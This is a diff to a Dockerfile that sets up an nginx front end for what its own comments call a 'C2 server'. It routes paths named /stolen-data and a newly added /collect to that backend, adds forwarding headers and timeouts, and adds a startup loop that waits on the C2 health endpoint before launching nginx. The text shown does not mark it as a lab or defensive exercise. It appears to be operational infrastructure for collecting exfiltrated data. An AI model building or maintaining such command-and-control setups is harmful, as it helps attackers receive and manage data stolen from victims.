@@ -35,13 +35,20 @@ RUN echo 'server { \
         try_files $uri $uri/ =404; \
     } \
     \
-    location ~ ^/(stolen-data|api|stats|health) { \
+    location ~ ^/(stolen-data|api|stats|health|collect) { \
         proxy_pass http://127.0.0.1:3000; \
         proxy_http_version 1.1; \
         proxy_set_header Upgrade $http_upgrade; \
         proxy_set_header Connection "upgrade"; \
         proxy_set_header Host $host; \
+        proxy_set_header X-Real-IP $remote_addr; \
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; \
+        proxy_set_header X-Forwarded-Proto $scheme; \
         proxy_cache_bypass $http_upgrade; \
+        proxy_connect_timeout 10s; \
+        proxy_send_timeout 30s; \
+        proxy_read_timeout 30s; \
+        proxy_buffering off; \
     } \
     \
     location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ { \
@@ -55,6 +62,25 @@ RUN cat > /init.sh << 'EOF'
 #!/bin/sh
 # Start C2 server in background
 cd /app/c2-server && node c2-server.js &
+C2_PID=$!
+
+# Wait for C2 server to be ready (check health endpoint)
+echo "Waiting for C2 server to start..."
+MAX_ATTEMPTS=30
+ATTEMPT=0
+while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
+  if wget --no-verbose --tries=1 --spider --timeout=2 http://127.0.0.1:3000/health 2>/dev/null; then
+    echo "C2 server is ready!"
+    break
+  fi
+  ATTEMPT=$((ATTEMPT + 1))
+  sleep 1
+done
+
+if [ $ATTEMPT -eq $MAX_ATTEMPTS ]; then
+  echo "WARNING: C2 server did not become ready in time, starting nginx anyway..."
+fi
+
 # Start nginx in foreground
 nginx -g "daemon off;"
 EOF
